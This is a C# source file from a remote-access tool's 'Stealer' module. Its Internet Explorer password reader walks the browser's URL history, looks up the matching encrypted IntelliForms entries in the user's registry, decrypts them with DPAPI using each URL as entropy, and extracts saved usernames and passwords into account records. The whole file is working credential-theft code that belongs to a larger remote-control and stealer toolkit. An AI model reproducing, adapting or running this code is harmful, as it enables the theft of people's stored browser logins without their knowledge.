using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Stealer.Helper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Browsers
{
    public class InternetExplorerPasswordReader : IAccountReader
    {
        public string ApplicationName => "Internet Explorer 浏览器";
        public string KeyName => "Password";
        private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

        private const uint PROV_RSA_FULL = 1;
        private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;
        private const int ALG_CLASS_HASH = 4 << 13;
        private const int ALG_SID_SHA1 = 4;

        [StructLayout(LayoutKind.Sequential)]
        private struct IESecretInfoHeader
        {
            public uint dwIdHeader;     // value - 57 49 43 4B
            public uint dwSize;         // size of this header....24 bytes
            public uint dwTotalSecrets; // divide this by 2 to get actual website entries
            public uint unknown;
            public uint id4;            // value - 01 00 00 00
            public uint unknownZero;
        };

        [StructLayout(LayoutKind.Sequential)]
        private struct IEAutoComplteSecretHeader
        {
            public uint dwSize;                        //This header size
            public uint dwSecretInfoSize;              //= sizeof(IESecretInfoHeader) + numSecrets * sizeof(SecretEntry);
            public uint dwSecretSize;                  //Size of the actual secret strings such as username & password
            public IESecretInfoHeader IESecretHeader;  //info about secrets such as count, size etc
            //SecretEntry secEntries[numSecrets];      //Header for each Secret String
            //WCHAR secrets[numSecrets];               //Actual Secret String in Unicode
        };

        [StructLayout(LayoutKind.Explicit)]
        private struct SecretEntry
        {
            [FieldOffset(0)]
            public uint dwOffset;           //Offset of this secret entry from the start of secret entry strings

            [FieldOffset(4)]
            public byte SecretId;           //UNIQUE id associated with the secret

            [FieldOffset(5)]
            public byte SecretId1;

            [FieldOffset(6)]
            public byte SecretId2;

            [FieldOffset(7)]
            public byte SecretId3;

            [FieldOffset(8)]
            public byte SecretId4;

            [FieldOffset(9)]
            public byte SecretId5;

            [FieldOffset(10)]
            public byte SecretId6;

            [FieldOffset(11)]
            public byte SecretId7;

            [FieldOffset(12)]
            public uint dwLength;           //length of this secret
        };

        private enum ALG_ID
        {
            CALG_MD5 = 0x00008003,
            CALG_SHA1 = ALG_CLASS_HASH | ALG_SID_SHA1
        }

        private enum HashParameters
        {
            HP_ALGID = 0x0001,   // Hash algorithm
            HP_HASHVAL = 0x0002, // Hash value
            HP_HASHSIZE = 0x0004 // Hash value size
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

        [DllImport("advapi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);

        [DllImport("advapi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptDestroyHash(IntPtr hHash);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            List<RecoveredAccount> result = new List<RecoveredAccount>();
            try
            {
                using (ExplorerUrlHistory ieHistory = new ExplorerUrlHistory())
                {
                    List<string[]> dataList = new List<string[]>();
                    foreach (SortFileTimeAscendingHelper.STATURL item in ieHistory)
                    {
                        try
                        {
                            if (DecryptIePassword(item.UrlString, dataList))
                            {
                                foreach (string[] loginInfo in dataList)
                                {
                                    result.Add(new RecoveredAccount()
                                    {
                                        KeyName = KeyName,
                                        Username = loginInfo[0],
                                        Password = loginInfo[1],
                                        Url = item.UrlString,
                                        Application = ApplicationName
                                    });
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            result.Add(new RecoveredAccount
                            {
                                Url = "访问浏览器DB出错: " + ex.Message,
                                Username = "N/A",
                                Password = "N/A",
                                Application = ApplicationName
                            });
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                result.Add(new RecoveredAccount
                {
                    KeyName = KeyName,
                    Url = "访问出错: " + ex.Message,
                    Username = "N/A",
                    Password = "N/A",
                    Application = ApplicationName
                });
            }
            if (result.Count <= 0)
            {
                result.Add(new RecoveredAccount
                {
                    KeyName = KeyName,
                    Url = "N/A",
                    Username = "N/A",
                    Password = "N/A",
                    Application = ApplicationName
                });
            }
            return result;
        }

        public static List<RecoveredAccount> GetSavedCookies()
        {
            return new List<RecoveredAccount>();
        }

        private static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return stuff;
        }

        private static bool DecryptIePassword(string url, List<string[]> dataList)
        {
            byte[] cypherBytes;
            string urlHash = GetURLHashString(url);
            if (!DoesURLMatchWithHash(urlHash))
                return false;
            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
            {
                if (key == null)
                    return false;
                cypherBytes = (byte[])key.GetValue(urlHash);
            }
            byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2);
            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);
            var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(decryptedBytes);
            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
            {
                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;
                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length);

                if (dataList == null)
                    dataList = new List<string[]>();
                else
                    dataList.Clear();

                offset = Marshal.SizeOf(ieAutoHeader);
                for (int i = 0; i < dwTotalSecrets; i++)
                {
                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
                    string[] dataTriplet = new string[3];
                    byte[] secret1 = new byte[secEntry.dwLength * 2];
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length);
                    dataTriplet[0] = Encoding.Unicode.GetString(secret1);
                    offset += sizeOfSecretEntry;
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
                    byte[] secret2 = new byte[secEntry.dwLength * 2];
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length);
                    dataTriplet[1] = Encoding.Unicode.GetString(secret2);
                    dataTriplet[2] = urlHash;
                    dataList.Add(dataTriplet);
                    offset += sizeOfSecretEntry;
                }
            }
            return true;
        }

        private static bool DoesURLMatchWithHash(string urlHash)
        {
            bool result = false;
            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
            {
                if (key == null)
                    return false;
                if (key.GetValueNames().Any(value => value == urlHash))
                    result = true;
            }
            return result;
        }

        private static string GetURLHashString(string wstrURL)
        {
            IntPtr hProv = IntPtr.Zero;
            IntPtr hHash = IntPtr.Zero;
            CryptAcquireContext(out hProv, String.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
            if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrURL);
            StringBuilder urlHash = new StringBuilder(42);
            if (CryptHashData(hHash, bytesToCrypt, (wstrURL.Length + 1) * 2, 0))
            {
                uint dwHashLen = 20;
                byte[] buffer = new byte[dwHashLen];
                if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                byte tail = 0;
                urlHash.Length = 0;
                for (int i = 0; i < dwHashLen; ++i)
                {
                    byte c = buffer[i];
                    tail += c;
                    urlHash.AppendFormat("{0:X2}", c);
                }
                urlHash.AppendFormat("{0:X2}", tail);
                CryptDestroyHash(hHash);
            }
            CryptReleaseContext(hProv, 0);
            return urlHash.ToString();
        }
    }
}